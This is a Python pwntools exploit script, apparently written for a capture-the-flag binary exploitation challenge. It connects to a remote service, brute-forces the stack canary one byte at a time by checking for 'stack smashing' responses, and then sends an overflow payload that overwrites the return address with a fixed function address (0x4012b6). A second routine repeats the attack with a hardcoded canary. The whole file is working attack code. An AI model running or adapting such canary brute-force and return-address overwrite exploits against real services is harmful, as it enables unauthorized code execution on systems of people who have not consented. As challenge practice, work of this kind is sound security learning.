from pwn import *

def _create_64bit_number(num):
    ch = b''
    for _ in range(8):
        ch += bytes([num % 256])
        num //= 256
    return ch

def send(conn, msg):
    print(msg)
    conn.send(msg)

print_all = False

def get_server_prompt(conn):
    response = conn.recvuntil(b'\n', drop=True)
    if print_all:
        print(response)
    response = conn.recvuntil(b'\n', drop=True)
    if print_all:
        print(response)
    response = conn.recvuntil(b'\n', drop=True)
    if print_all:
        print(response)
    response = conn.recvuntil(b'\n', drop=True)
    if print_all:
        print(response)


def attack():
    #server = '0.cloud.chals.io'
    #port = 17381 

    server = '10.2.0.48'
    port = 1241 

    #server = '172.17.0.2'
    #port = 22334 

    #server = '10.0.0.229'
    #port = 22335


    conn = remote(server, port)

    response = conn.recvline()
    print(response)
    send(conn, b"-1\n")
    
    canaries = []
    
    for index1 in range(8):
        message = b'12345678'
        for canary in canaries:
            message += canary

        for index3 in range(256):
            get_server_prompt(conn)

            canary = bytes([index3])
            send(conn, message + canary)   

            response1 = conn.recvuntil(b'\n', drop=True)
            response1 = response1.decode("utf-8") 
            #print(response1)
            if response1.find('smashing') == -1:
                print(f"found canary {index1}") 
                canaries.append(canary)
                break

            response2 = conn.recvuntil(b'\n', drop=True)
            #print(response2)

    global print_all
    print_all = True        
    message += canaries[-1]
    
    message += _create_64bit_number(0)

    message += _create_64bit_number(0x4012b6)

    #input("send mesg?")
    get_server_prompt(conn)
    send(conn, message)   
    response1 = conn.recvuntil(b'\n', drop=True)
    response1 = response1.decode("utf-8") 
    print(response1)

    response1 = conn.recvuntil(b'\n', drop=True)
    response1 = response1.decode("utf-8") 
    print(response1)

    response1 = conn.recvuntil(b'\n', drop=True)
    response1 = response1.decode("utf-8") 
    print(response1)

    time.sleep(0.5)
    conn.close()
    print("---------------end---------------")
    
def atttck_with_known_canary():
    server = '172.17.0.2'
    port = 22334 

    conn = remote(server, port)

    response = conn.recvline()
    print(response)
    send(conn, "-1\n")
    
    message = b'12345678\x00\xfa\x4d\xce\x54\xa6\x9d\xcb'

    message += _create_64bit_number(0x0000000000001000)

    message += _create_64bit_number(0x4012b6)

    global print_all
    print_all = True        

    input('send?')
    
    get_server_prompt(conn)
    send(conn, message)   
    response1 = conn.recvuntil(b'\n', drop=True)
    response1 = response1.decode("utf-8") 
    print(response1)

    response1 = conn.recvuntil(b'\n', drop=True)
    response1 = response1.decode("utf-8") 
    print(response1)

    response1 = conn.recvuntil(b'\n', drop=True)
    response1 = response1.decode("utf-8") 
    print(response1)

    time.sleep(0.5)
    conn.close()
    print("---------------end---------------")
    

    

if __name__ == '__main__':
    attack()
    #atttck_with_known_canary()
